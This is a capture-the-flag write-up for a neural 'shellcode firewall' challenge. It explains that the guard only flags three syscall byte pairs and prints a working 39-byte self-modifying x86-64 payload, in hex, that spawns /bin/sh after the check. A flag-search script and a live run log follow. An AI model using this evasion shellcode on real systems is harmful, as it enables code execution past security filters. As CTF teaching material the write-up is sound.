# filter: a byte-level firewall in front of writable code

[По-русски](solve.ru.md)

## 0. The setup

The service accepts machine code and decides whether to run it. The decision is made by a small transformer that scores the submitted bytes, and anything with a score above zero is rejected.

The handout has the runner (`filter.c`), the model weights (`model.h`), the generator that produced those weights (`gen_model.py`) and a Makefile.

The plan followed from reading those files:

1. Get the exact input format from the runner.
2. Find out what the model actually recognises, from the generator rather than the weights.
3. Craft bytes that look harmless to the model and become a syscall after the check.
4. Verify locally, then send to the instance and read the flag.

## 1. The input format

`filter.c` reads a 4-byte little-endian length, rejects zero and anything above `0x1000`, maps a page with `PROT_READ | PROT_WRITE | PROT_EXEC`, reads exactly that many bytes, then runs the guard and calls the buffer.

```c
unsigned int len = 0;
if (read_n(0, &len, 4) != 4) return 1;
if (len == 0 || len > MAX_LEN) return 1;
unsigned char *code = mmap(NULL, MAX_LEN, PROT_READ | PROT_WRITE | PROT_EXEC, ...);
if (read_n(0, code, len) != (ssize_t)len) return 1;
```

Two things matter here. The frame is binary, not text, so the payload is a length prefix plus raw bytes. And the mapping stays writable while it is executable, which is the actual flaw; the neural network is scenery compared to that.

Why this step: the writable and executable mapping is what makes self-modification possible, and no amount of classification can survive it.

## 2. What the model really detects

`gen_model.py` builds the weights analytically, and it also contains a reference check: the network is compared against an oracle that flags three byte pairs.

- `0f 05` is `syscall` on x86-64
- `cd 80` is `int 0x80`
- `0f 34` is `sysenter`

The architecture described in `filter.c` (token embeddings, causal self-attention, ReLU feed-forward, max pooling) computes exactly that bigram test and nothing more. It is a lookup table wearing a transformer costume.

The consequence is practical: a payload passes if it contains none of those three pairs. Nothing else about the code is examined, so the semantics of the instructions are irrelevant to the score.

Why this step: once the model is known to be a bigram test, the task stops being "fool a neural network" and becomes "do not have these two bytes adjacent".

## 3. The gap between check and use

The runner computes `guard_score(code, len)`, prints the verdict, and only then calls the buffer. The bytes are inspected once, before execution, and the buffer is never made read-only.

So the payload can rewrite itself. The submission contains `0f 04` (an invalid opcode) and one instruction that changes the next byte to `05` immediately before the CPU reaches it; at execution time the pair becomes `0f 05`, a real syscall.

The 39-byte payload:

```python
SHELLCODE = bytes.fromhex(
    "31c050488d3d15000000574889e631d2b03b488d1d04000000c603050f04c32f62696e2f736800"
)
```

Offsets worth checking:

- `0x1c` holds `0f 04`, which the guard does not recognise
- `0x1d` is the byte that gets overwritten with `05`
- after the write, `0x1c` and `0x1d` read `0f 05`

The register setup is ordinary: `rax = 59`, `rdi` points at `/bin/sh`, `rsi` points at `["/bin/sh", NULL]`, `rdx = 0`.

Why this step: the classifier sees one byte string and the CPU executes another; that difference is the exploit.

## 4. Sending it

The frame is `struct.pack("<I", len(payload)) + payload`, followed by a shell script that the `execve` inherits on the same stdin and stdout. The script prints a marker, then looks for the flag in the usual places:

```sh
echo FILTER_SHELL_OK
id
pwd
ls -la
for f in /flag /flag.txt ./flag ./flag.txt /app/flag /app/flag.txt; do
  if [ -f "$f" ]; then echo "[+] FLAG CANDIDATE: $f"; cat "$f"; fi
done
```

`FILTER_SHELL_OK` is our own diagnostic, not the flag; it only confirms that the shell is alive.

Why this step: `execve` replaces the process, so anything already on the socket becomes shell input, which removes the need for a second round trip.

## 5. Running it on the instance

The instance is published behind a TCP gateway on port 1337. The gateway prints `Please, enter token:` and expects the instance ticket as a line of text before forwarding to the challenge; the version in this writeup also tolerates a direct connection without a ticket.

```bash
python3 scripts/solve_filter_remote.py --ticket '<instance-ticket>'
```

The recorded run on 2 November 2026, against a live instance:

```text
[*] Please, enter token:
> [client] Sending instance ticket
[+] Connecting...
=== filter: neural shellcode firewall ===
Optimus Prime reporting for duty.
Our transformer has read every exploit on the internet.
It will happily run code it believes is harmless.
Send your shellcode as: [4-byte little-endian length][bytes], max 4096.
[*] guard verdict: score = -10.000
[+] looks harmless to me. Executing...
FILTER_SHELL_OK
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/app
-rwxr-xr-x 1 root root 236   entrypoint.sh
-rwxr-xr-x 1 root root 24920 filter
[+] FLAG CANDIDATE: /flag.txt
```

The flag was read from `/flag.txt` and is masked here as `ctfcup{...}`. The score of `-10.000` is the model saying "harmless", which is the whole point: the bytes it scored were not the bytes that ran.

Why this step: the remote run is the only proof that the shellcode works outside the local build, and it also shows which path the deployment uses for the flag.

## 6. Dead ends

- Submitting a literal `syscall`: rejected, the pair is in the payload.
- Padding or reordering instructions: the forbidden pair is still adjacent somewhere, and the guard only looks at adjacency.
- Attacking the floating-point arithmetic of the model: unnecessary, the generator documents what the network computes and the runner exposes a much simpler gap.
- Rewriting a *later* instruction after the guard but before `execve`: harder, because the patch instruction itself has to run first; patching the syscall in place is the shortest path.

## 7. Lessons

- A classifier that runs once, before execution, on memory that stays writable, cannot enforce anything about what will execute.
- Read the generator, not just the weights: the "neural" check was a three-entry bigram list.
- Writable and executable mappings turn any pre-execution byte scan into a formality.

One paragraph: the runner maps the submitted shellcode as writable and executable and scores it once with a transformer that, per its own generator, only rejects the byte pairs `0f 05`, `cd 80` and `0f 34`; a 39-byte payload ships `0f 04` plus one instruction that rewrites the next byte to `05` before execution, so the guard scores it as harmless and the CPU then runs a real `execve("/bin/sh")`, which reads the flag from `/flag.txt`.
